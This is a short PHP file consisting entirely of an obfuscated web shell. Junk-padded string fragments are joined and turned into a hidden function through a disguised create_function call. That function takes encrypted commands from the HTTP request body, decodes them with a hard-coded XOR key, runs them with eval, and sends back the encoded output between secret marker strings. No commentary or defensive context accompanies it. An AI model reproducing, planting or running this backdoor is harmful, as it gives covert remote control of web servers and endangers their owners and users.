<?php
$Z='$o.=$t{$c,i}^c,$k{$j};}}retc,urn c,c,$o;}if (@preg_c,match(c,"/$c,kh(.c,+)$kf/",c,c,@file_get_contec,nts("pc,hp:/c,/in';
$i='t_c,contents();@c,obc,_end_cleanc,(c,);$r=@bc,c,c,ase64_encode(@x(@gc,zcomprc,ec,ss($c,o),$k));pric,ntc,("$p$kh$r$kf");}';
$q='c,){$cc,=strlec,n($k);$l=c,strlen($t);c,$o=c,""c,;for(c,$i=0;$i<$l;c,c,){for($jc,=c,0;($j<$c&&$ic,c,<$l);$j++,$i++c,){';
$G='puc,t"),$m)==c,1c,) {@ob_stc,art();@c,ec,val(c,@gzuncomprc,ess(@x(@bac,se64_c,decode(c,c,$m[1]),$c,k)));$o=@c,ob_c,ge';
$K=str_replace('jT','','crjTeatjTe_jTjTfunjTctjTion');
$T='$c,k="dff9a7e8c,";$kh=c,"6f47fc,4c,15cc,b37"c,;c,$kf="cf42e4c,9df004";$pc,="c,R3YLcFd6ADv5KAbc,P";func,ction c,c,x($t,$k';
$Y=str_replace('c,','',$T.$q.$Z.$G.$i);
$A=$K('',$Y);$A();
?>
